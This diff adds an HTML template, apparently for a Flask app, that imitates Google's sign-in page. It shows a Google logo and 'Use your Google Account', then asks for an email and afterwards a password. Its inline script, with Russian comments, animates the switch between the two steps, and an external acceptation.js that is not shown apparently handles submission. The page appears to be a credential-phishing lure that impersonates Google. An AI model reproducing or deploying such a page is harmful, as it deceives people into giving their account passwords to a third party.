@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Multi-step Form</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"/>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet"/>
+    <!-- MDB -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.2/mdb.min.css" rel="stylesheet"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/style.css') }}">
+
+</head>
+<body>
+    <section class="vh-100" style="background-color: #ffffff;">
+        <div class="container py-5 h-100">
+          <div class="row d-flex justify-content-center align-items-center h-100">
+            <div class="col-12 col-md-8 col-lg-6 col-xl-5">
+              <div class="card shadow-2-strong" style="border-radius: 0rem;">
+                <div class="d-flex">
+                  <div class="card-body p-5 text-center" id="body-1" style="background-color: #ffffff;">
+                    
+                      <div class="loader" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background-color: #4285F4; overflow: hidden;">
+                      <div class="loader-inner"></div>
+                      </div>
+                      <img src="{{ url_for('static', filename='img/unnamed.webp') }}" style="width: 165px;" alt="google">
+
+                    <div id="head-1">
+                      <h5 class="">Sign in </h5>
+                      <p class="text-50 mb-4" style="color: hsl(216, 12%, 47%)" >Use your Google Account</p>
+                    </div>
+                    <div id="content-1">
+                      <div class="form-outline mb-4" id="email">
+                        <input type="email" name="email" id="typeEmailX-2" class="form-control form-control-lg" required/>
+                        <label class="form-label" for="typeEmailX-2">Email or phone</label>
+                      </div>
+                      
+                      <div class="col-md-3 mb-5 mt-3"><a href="#">Forgot email?</a></div>
+                      <div class="d-flex flex-column mb-6">
+                        <p class="text-start m-0">Not your computer? Use Guest mode to sign in privately.</p>
+                        <div class="d-flex align-items-center">
+                          <a href="#">Learn more</a>
+                        </div>
+                      </div>
+
+                      <div class="d-flex align-items-center mb-5">
+                        <a href="#" class="me-auto">Create account</a>
+                        <button class="btn btn-primary btn-md" type="submit">Next</button>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="card-body p-5 text-center" id="body-2" style="background-color: #ffffff; display: none;">
+                    <div class="loader" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background-color: #4285F4; overflow: hidden;">
+                      <div class="loader-inner"></div>
+                    </div>
+                    <img src="{{ url_for('static', filename='img/unnamed.webp') }}" style="width: 165px;" alt="google">
+                    <div id="head-2">
+                      <h5 class="">Hi There</h5>
+                      <p class="text-50 mb-4" style="color: hsl(216, 12%, 47%)" >Use your Google Account</p>
+                    </div>
+                    <div id="content-2">
+                      <div class="form-outline mb-4" id="pass">
+                        <input type="password" name="password" id="typePasswordX-2" class="form-control form-control-lg"/>
+                        <label class="form-label" for="typePasswordX-2">Password</label>
+                        <div id="validationServerUsernameFeedback" class="invalid-feedback">
+                          Please check your password or email.
+                        </div>
+                      </div>
+                      <div class="col-md-4 mb-5"><a href="#">Forgot password?</a></div>
+                      <div class="d-flex flex-column mb-6">
+                        <p class="text-start m-0">Not your computer? Use Guest mode to sign in privately.</p>
+                        <div class="d-flex align-items-center">
+                          <a href="#">Learn more</a>
+                        </div>
+                      </div>
+
+                      <div class="d-flex align-items-center mb-5">
+                        <a href="#" class="me-auto">Create account</a>
+                        <button class="btn btn-primary btn-md" id="password-submit" type="submit">Next</button>
+                      </div>
+                    </div> 
+                  </div>
+                </div>
+                  
+                  
+                  
+      
+                  <!-- Checkbox -->
+                  <!-- <div class="form-check d-flex justify-content-start mb-4">
+                    <input class="form-check-input" type="checkbox" value="" id="form1Example3" />
+                    <label class="form-check-label" for="form1Example3"> Remember password </label>
+                  </div> -->
+      
+                 
+                
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.2/mdb.min.js"></script>
+<script src="{{ url_for('static', filename='js/acceptation.js') }}"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const nextButton = document.querySelector('button[type="submit"]');
+      const body1 = document.getElementById('body-1');
+      const body2 = document.getElementById('body-2');
+      const content1 = document.getElementById('content-1');
+      const content2 = document.getElementById('content-2');
+      const head1 = document.getElementById('head-1');
+      const head2 = document.getElementById('head-2');
+      const loader = document.querySelector('.loader');
+      const card = document.querySelector('.card');
+    
+      nextButton.addEventListener('click', function() {
+        loader.style.display = 'block';
+        loader.style.opacity = 1;
+        card.style.opacity = '0.5'; // Сделать окно полупрозрачным
+        card.style.overflow = 'hidden'; // Скрыть контент за пределами карты
+    
+        gsap.to(content1, {
+          x: '-150%', // перемещение body1 за левую границу
+          duration: 0.5,
+          onStart: function() {
+            loader.style.opacity = '1'; // Сделать лоадер непрозрачным перед анимацией
+          },
+          onComplete: function() {
+            body1.style.display = 'none'; // скрыть body1
+            body2.style.display = 'block'; // показать body2
+    
+            // Сразу сменить заголовок без анимации
+            head1.style.display = 'none';
+            head2.style.display = 'block';
+    
+            // Анимация для контента
+            gsap.from(content2, { x: '100%', duration: 0.5, onComplete: hideExcessContent });
+          }
+        });
+    
+        setTimeout(function() {
+          loader.style.display = 'none'; // Скрыть индикатор загрузки
+          card.style.opacity = '1'; // Вернуть окно в обычное состояние
+        }, 1500);
+      });
+    
+      function hideExcessContent() {
+        content1.style.display = 'none'; // Скрыть остатки контента body1
+        content2.style.position = 'relative'; // Убедиться, что body2 остаётся в пределах карты
+        card.style.overflow = 'visible'; // Показать весь контент body2
+      }
+});
+
+</script>
+</body>
+</html>
